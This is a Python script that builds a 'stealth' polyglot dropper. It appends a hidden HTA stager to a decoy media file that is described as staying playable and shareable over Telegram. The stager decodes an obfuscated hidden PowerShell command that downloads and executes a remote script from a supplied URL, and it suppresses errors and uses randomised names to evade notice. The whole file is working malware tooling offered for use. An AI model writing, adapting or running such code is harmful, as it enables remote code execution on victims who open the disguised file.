import os
import sys
import random
import string
from pathlib import Path

def random_string(length):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def build_polyglot(decoy_path: str, hosted_url: str, output_path: str) -> str:
    """
    Stealth dual-layer polyglot:
    - Decoy preserved for playability
    - HTA stager appended at tail (executes via mshta)
    - ID3 and structure untouched (Telegram friendly)
    """

    os.makedirs(os.path.dirname(output_path), exist_ok=True)

    # Read decoy
    with open(decoy_path, "rb") as f:
        decoy_data = f.read()

    # Powershell launcher
    ps = (
        f"powershell -w hidden -ep bypass -c "
        f"\"$a='{hosted_url}';"
        f"$b=New-Object Net.WebClient;"
        f"$d=$b.DownloadString($a);"
        f"$s='Script'+'Block';"
        f"&([type]$s)::Create($d)\""
    )

    # Encode PowerShell with XOR
    key = random.randint(30, 120)
    encoded = [(ord(c) + key) % 256 for c in ps]

    # Random ID and Name
    app_id = random_string(8)
    app_name = random_string(10)

    # HTA payload
    hta = f"""<html><head><HTA:APPLICATION ID="{app_id}" APPLICATIONNAME="{app_name}" BORDER="none"
SHOWINTASKBAR="no" SINGLEINSTANCE="yes" SYSMENU="no" WINDOWSTATE="minimize"></head>
<script>window.moveTo(-1,0); window.onerror=function(){{return true}};</script>
<script>
try {{
    var d = [{','.join(map(str, encoded))}];
    var x = {key};
    var r = '';
    for (var i = 0; i < d.length; i++) {{
        r += String.fromCharCode((d[i] - x + 256) % 256);
    }}
    new ActiveXObject("WScript.Shell").Run(r, 0, false);
    window.close();
}} catch(e) {{}}
</script></html>
""".strip().encode("utf-8")

    # Final: do not touch the beginning, just append HTA at tail
    final_data = decoy_data + b"\n" + hta

    # Validate
    if b"<HTA:APPLICATION" not in final_data:
        raise RuntimeError("[❌] HTA not injected properly")

    with open(output_path, "wb") as f:
        f.write(final_data)

    print(f"[✅] Built: {output_path}", file=sys.stderr)
    print(f"    ┗ AppID: {app_id}", file=sys.stderr)
    print(f"    ┗ Exec URL: {hosted_url}", file=sys.stderr)
    print(f"    ┗ Size: {len(final_data)} bytes", file=sys.stderr)

    return output_path